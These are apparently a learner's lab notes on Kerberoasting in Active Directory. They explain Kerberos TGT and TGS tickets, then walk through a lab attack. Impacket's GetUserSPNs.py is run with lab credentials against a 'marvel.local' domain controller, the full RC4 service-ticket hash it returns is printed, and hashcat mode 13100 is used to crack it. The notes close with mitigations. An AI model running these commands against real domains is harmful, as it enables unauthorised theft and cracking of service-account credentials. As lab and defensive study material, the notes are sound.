## Overview

  

---

## Kerberoasting Overview

### Key Concepts

1. **Domain Controller as the Key Distribution Center (KDC)**:
    - The **Domain Controller (DC)** plays a central role in Kerberos authentication by serving as the KDC.
2. **Ticket Types**:
    - **Ticket-Granting Ticket (TGT)**:
        - Requested by a user for authentication to the KDC.
        - Encrypted using the KDC's key (TGT hash).
    - **Ticket-Granting Service Ticket (TGS)**:
        - Used to access specific services (e.g., SQL Server, Antivirus) with an **Service Principal Name (SPN)**.
        - Encrypted using the target service account's hash.

---

### Kerberoasting Workflow

1. **Obtain Ticket-Granting Ticket (TGT)**:
    
    - **User Action**:
        - Sends NTLM hash (derived from username/password) to the KDC.
    - **Response**:
        - DC issues a **TGT** encrypted with the KDC’s secret key.
    
    **Note**:
    
    - Any valid user with credentials (not necessarily an admin) can obtain a TGT.
2. **Request a Service Ticket (TGS)**:
    - **User Action**:
        - Presents the TGT to the KDC and requests a TGS for a specific service with an SPN (e.g., SQL Server).
    - **Response**:
        - KDC returns a TGS encrypted with the **target service account's hash**.
3. **Decrypting and Cracking the TGS**:
    - **Attack Action**:
        - Extract the TGS ticket and attempt to crack its encryption to retrieve the **service account hash**.
    - Tools:
        - Use `GetUserSPNs.py` from Impacket to extract service tickets.
        - Crack the hash using tools like Hashcat.

---

### Practical Implementation of Kerberoasting

1. **Extract Service Tickets**:
    - Using Impacket's `GetUserSPNs.py`:
        
        ```Shell
        python GetUserSPNs.py -dc-ip [DC_IP] [DOMAIN]/[USERNAME]:[PASSWORD]
        ```
        
    - Example:
        
        ```Shell
        python GetUserSPNs.py -dc-ip 192.168.1.10 Marvel.local/FrankCastle:password1
        ```
        
2. **Crack the Service Ticket Hash**:
    - Extract and save the ticket hash from the output of `GetUserSPNs.py`.
    - Use Hashcat to attempt cracking:
        
        ```Shell
        hashcat -m 13100 [HASH_FILE] [WORDLIST]
        ```
        

---

### Key Takeaways

- Kerberoasting allows an attacker with valid credentials to target service accounts by cracking hashes of service tickets.
- This attack does **not require domain admin privileges**, only valid user credentials.

---

### Example Use Case

- Scenario:
    - The attacker compromises the credentials for `Frank Castle` (user: `FrankCastle`, password: `password1`).
    - Executes `GetUserSPNs.py` to retrieve hashes of service tickets.
    - Cracks service hashes to gain access to privileged service accounts.

---

### Summary Workflow

1. Valid user logs into the KDC and requests a **TGT**.
2. The user requests a **TGS** for a specific service (identified by an SPN).
3. The KDC provides the TGS encrypted with the service account’s hash.
4. The attacker extracts the TGS hash and cracks it to retrieve the plaintext password of the service account.

---

### Tools Highlighted

- **Impacket’s** `**GetUserSPNs.py**`: For requesting TGS hashes.
- **Hashcat**: For cracking the service account hash.

---

## Kerberoasting Walkthrough

---

**Kerberoasting Attack Workflow**

### Step 1: Initiating the Attack

- Navigate to Impacket > examples > 
    
    ```Bash
    ┌─[root@parrot]─[/home/z3tssu/impacket/examples]
    └──╼ \#ls
    aclpwn-20241229-215854.restore  GetLAPSPassword.py  mssqlinstance.py  sambaPipe.py
    addcomputer.py                  GetNPUsers.py       net.py            samrdump.py
    atexec.py                       getPac.py           netview.py        secretsdump.py
    changepasswd.py                 getST.py            ntfs-read.py      services.py
    dacledit.py                     getTGT.py           ntlmrelayx.py     smbclient.py
    dcomexec.py                     GetUserSPNs.py      owneredit.py      smbexec.py
    describeTicket.py               goldenPac.py        ping6.py          smbserver.py
    dpapi.py                        karmaSMB.py         ping.py           sniffer.py
    DumpNTLMInfo.py                 keylistattack.py    psexec.py         sniff.py
    esentutl.py                     kintercept.py       raiseChild.py     split.py
    exchanger.py                    lookupsid.py        rbcd.py           ticketConverter.py
    findDelegation.py               lootme              rdp_check.py      ticketer.py
    GetADComputers.py               machine_role.py     registry-read.py  tstool.py
    GetADUsers.py                   mimikatz.py         reg.py            wmiexec.py
    getArch.py                      mqtt_check.py       rpcdump.py        wmipersist.py
    Get-GPPPassword.py              mssqlclient.py      rpcmap.py         wmiquery.py
    ┌─[root@parrot]─[/home/z3tssu/impacket/examples]
    ```
    
- Use the command `GetUserSPNs`:
    
    ```Shell
    python3 GetUserSPNs.py marvel.local/fcastle:Password@01 -dc-ip 192.168.213.158 -reques
    ```
    
- Output
    
    ```Bash
    ┌─[root@parrot]─[/home/z3tssu/impacket/examples]
    └──╼ \#python3 GetUserSPNs.py marvel.local/fcastle:Password@01 -dc-ip 192.168.213.158 -request
    Impacket v0.11.0 - Copyright 2023 Fortra
    
    ServicePrincipalName                    Name        MemberOf                                                     PasswordLastSet             LastLogon  Delegation 
    --------------------------------------  ----------  -----------------------------------------------------------  --------------------------  ---------  ----------
    Hydra-DC/SQLService.MARVEL.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=marvel,DC=local  2024-11-03 22:32:05.896186  <never>               
    
    
    
    [-] CCache file is not found. Skipping...
    $krb5tgs$23$*SQLService$MARVEL.LOCAL$marvel.local/SQLService*$e027080d33a332a75e5d5ce1a87ee91f$4ee6d063cd25f1e7cb55626a96f4a7ecef75d092fb60812cd59902ccd638a6197394df5c72457ada30dc9812dff87f929b69144113970a1d92bfbe3081113e989ea04e8d0b26a15995cbaeedcf15266f4a16823a8bc49cfa9aeb168275b5cc1b7b5711ecf5521f92ade3bd5cd1a5b6f881747918bc7e849e12ddef1608f36f1a2e65036d114a56e80b7d27f06b58da775ef5bf39e820043efbe716c8c707bcd9ac8d6e09fb35f3dc3e675c923c887563209ae3478fb1862ca4da5a288a308ce7a8c8469e5a74f47a1c61457b3b58b0bb16d296f4e835200f5f18644573cf46cc595986c320186e076933218c3c080aad876a55080d3653b2512a5763bf127b49e303483824c511d9e407661dd8f54351e4885b51fc5d145695d9a381e7e52c263f6da8264d63b7d178fb220dab1da35a360baa1d9cf0b7a94ce64fd4ef43d7eb011057571dd4d5c72d1df409c965f12661b402dcb78664571fad0f8330ef130043699bdaba30cd9aa9e59a893146aa56c9584f46a1b3c8ec65bbe7ca240cf46bfb262684c7bea5399d7d7042eb8c06f8628e0a4d80343ba1fd11d5fe1cb1dbde1c5ef3f8b17052b50cc3dd4353e03aa449a057c71e567b84abe5ed2e30fee7f510960473621a9d90f3452cac185e9b540cd56a00fa3a423625ab12f6b5a392abe6ec3154a8e4464dff31b3e17042dc4c018357c1610dff410681ba826b75870e4aa0ce32287d2f59a925ab3011df6515a1848469fa29d9f2a3987dc349b5f8917efb96953afdaad9c6e610a11952c53b0a70ca2a04d25b48282b61fd994e963ddbeda15e0205c5f9a9f2a5bf576e1f68f54fc0c1db55784aa9e3b01e74e4c3a7479b55f771357cde86ab19d8fe0e6fdbed67a31805eb207b5c3db84a617ec5f9e706ac4b74a97f8ff9b78b7cd901cf28976918575be2c8d069a77eab58e904abe96dca7e47c5341c774ba7a7a5a4290425147e8cea1aa661118a00f09a348c77c417e2112c7c5180716b46d21560bcafc616ed000d6a97e531680abe02c73f51d84ff38025349e8e8e0e0f9ecd6e0a5ebc75c61e434b21bdf8c83324d5cf48b43d11feccbe69e8beee5671e522239311e20506f55498522cf1b058448cf2151b5f9de2a04d80f87f089e3c658de4af85190be832932f9f81366d975869e9b0d4a58aacf21537ed25f40d51c293aee52e6d789124b351dec33de3d4632421a6ca5c88dce98c3a70861e721ccfbc140a05eba059120eb025443debec9696c51fea4b5acce7e232bcdb99dbb32c
    ```
    

### Step 2: Extracting the Hash

- Copy the Kerberos TGS hash, typically formatted as `RC4-HMAC`.
    
    ```Bash
    ┌─[root@parrot]─[/home/z3tssu/TCM]
    └──╼ \#echo "$krb5tgs$23$*SQLService$MARVEL.LOCAL$marvel.local/SQLService*$e027080d33a332a75e5d5ce1a87ee91f$4ee6d063cd25f1e7cb55626a96f4a7ecef75d092fb60812cd59902ccd638a6197394df5c72457ada30dc9812dff87f929b69144113970a1d92bfbe3081113e989ea04e8d0b26a15995cbaeedcf15266f4a16823a8bc49cfa9aeb168275b5cc1b7b5711ecf5521f92ade3bd5cd1a5b6f881747918bc7e849e12ddef1608f36f1a2e65036d114a56e80b7d27f06b58da775ef5bf39e820043efbe716c8c707bcd9ac8d6e09fb35f3dc3e675c923c887563209ae3478fb1862ca4da5a288a308ce7a8c8469e5a74f47a1c61457b3b58b0bb16d296f4e835200f5f18644573cf46cc595986c320186e076933218c3c080aad876a55080d3653b2512a5763bf127b49e303483824c511d9e407661dd8f54351e4885b51fc5d145695d9a381e7e52c263f6da8264d63b7d178fb220dab1da35a360baa1d9cf0b7a94ce64fd4ef43d7eb011057571dd4d5c72d1df409c965f12661b402dcb78664571fad0f8330ef130043699bdaba30cd9aa9e59a893146aa56c9584f46a1b3c8ec65bbe7ca240cf46bfb262684c7bea5399d7d7042eb8c06f8628e0a4d80343ba1fd11d5fe1cb1dbde1c5ef3f8b17052b50cc3dd4353e03aa449a057c71e567b84abe5ed2e30fee7f510960473621a9d90f3452cac185e9b540cd56a00fa3a423625ab12f6b5a392abe6ec3154a8e4464dff31b3e17042dc4c018357c1610dff410681ba826b75870e4aa0ce32287d2f59a925ab3011df6515a1848469fa29d9f2a3987dc349b5f8917efb96953afdaad9c6e610a11952c53b0a70ca2a04d25b48282b61fd994e963ddbeda15e0205c5f9a9f2a5bf576e1f68f54fc0c1db55784aa9e3b01e74e4c3a7479b55f771357cde86ab19d8fe0e6fdbed67a31805eb207b5c3db84a617ec5f9e706ac4b74a97f8ff9b78b7cd901cf28976918575be2c8d069a77eab58e904abe96dca7e47c5341c774ba7a7a5a4290425147e8cea1aa661118a00f09a348c77c417e2112c7c5180716b46d21560bcafc616ed000d6a97e531680abe02c73f51d84ff38025349e8e8e0e0f9ecd6e0a5ebc75c61e434b21bdf8c83324d5cf48b43d11feccbe69e8beee5671e522239311e20506f55498522cf1b058448cf2151b5f9de2a04d80f87f089e3c658de4af85190be832932f9f81366d975869e9b0d4a58aacf21537ed25f40d51c293aee52e6d789124b351dec33de3d4632421a6ca5c88dce98c3a70861e721ccfbc140a05eba059120eb025443debec9696c51fea4b5acce7e232bcdb99dbb32c" > Kerberoast_ticket_hash.txt
    ```
    

  

---

**Hash Cracking**

1. **Select the Proper Hashcat Module**:
    - Locate module using:
        
        ```Bash
        hashcat --help | grep Kerberos
        ```
        
        ```Shell
        ┌─[root@parrot]─[/home/z3tssu/TCM]
        └──╼ \#hashcat --help | grep Kerberos
          19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
          19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
          28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
          19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
          19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
          28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
           7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
          13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
          18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
        ```
        
    - Use `13100` for Kerberos 5 TGS.
2. **Command for Hashcat**:
    
    ```Shell
    hashcat -m 13100 <hashfile> <wordlist> -O
    ```
    
    - Replace `<hashfile>` with the filename containing hashes (e.g., `hashes.txt`).
    - Use a common wordlist (e.g., `rockyou.txt`).
    

---

**Key Points:**

- **Password Weaknesses**:
    - Even 14-character passwords may be vulnerable if they are dictionary-based or predictable.
    - Example cracked password: `Password1234!`.
- **Service Accounts**:
    - The example discovered a domain SQL service password.
    - **Mistake**: Service accounts with elevated privileges (e.g., domain admin) create vulnerabilities.
- **Attack Exploitation**:
    - Cracked credentials allow:
        - Domain controller access.
        - Lateral or vertical privilege escalation.

---

## Mitigations

Here are the extracted notes for the **Kerberoasting Mitigation** and an introduction to the **CPassword Attack** saved in a markdown file:

---

**Kerberoasting Mitigations**

### Key Mitigation Strategies:

1. **Strong Passwords**:
    - Use long passwords (30+ characters). The longer, the better.
    - Avoid using predictable or dictionary-based passwords, even if they are long.
2. **Principle of Least Privilege**:
    - Do not assign domain admin privileges to service accounts unnecessarily.
    - Limit service account permissions to only what is required for operation.
3. **Reduce Common Weaknesses**:
    - Avoid weak passwords for service accounts.
    - Address common misconfigurations that combine weak passwords with elevated privileges.

**Summary**:

- Kerberoasting exploits a native Windows feature.
- Prevention depends largely on strong, lengthy passwords and limiting privileges of service accounts.

---